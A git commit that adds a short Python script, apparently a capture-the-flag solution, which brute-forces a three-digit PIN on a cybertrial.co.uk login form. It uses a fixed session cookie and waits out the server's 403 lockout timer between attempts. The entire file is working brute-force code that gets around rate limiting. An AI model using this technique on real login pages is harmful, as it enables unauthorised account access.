f2e82bde5880a9726c12c621fb4f5a779c8be9e9
u91o <null@null.null>
2019-11-01 17:26:58 +0000

    great chinese firewall

---
+++ 2019/superfirewall3.py
@@ -0,0 +1,26 @@
+import re, requests, sys, time
+
+
+url = "http://104.cybertrial.co.uk/login"
+cookies = {"PHPSESSID": "phn7307tcpd7t988doplh0j9c7"}
+timeout = 11
+sess = requests.session()
+
+for pin in range(100,200):
+    payload = {"formgo": "1",
+               "pin": "{0:0=3d}".format(pin)
+    }
+    resp = sess.post(url, data=payload, cookies=cookies)
+
+    while resp.status_code == 403:
+        timeout = re.findall("0000;'>([0-9]*)<\/span", resp.text)[0]
+        print("timeout, waiting {} seconds".format(timeout))
+        time.sleep(int(timeout) + 1)
+        resp = sess.post(url, data=payload, cookies=cookies)
+        
+    check = re.search("Your pin is incorrect", resp.text)
+    if check:
+        print("incorrect pin:", "{0:0=3d}".format(pin))
+    else:
+        print("the pin is:", str(pin))
+        break
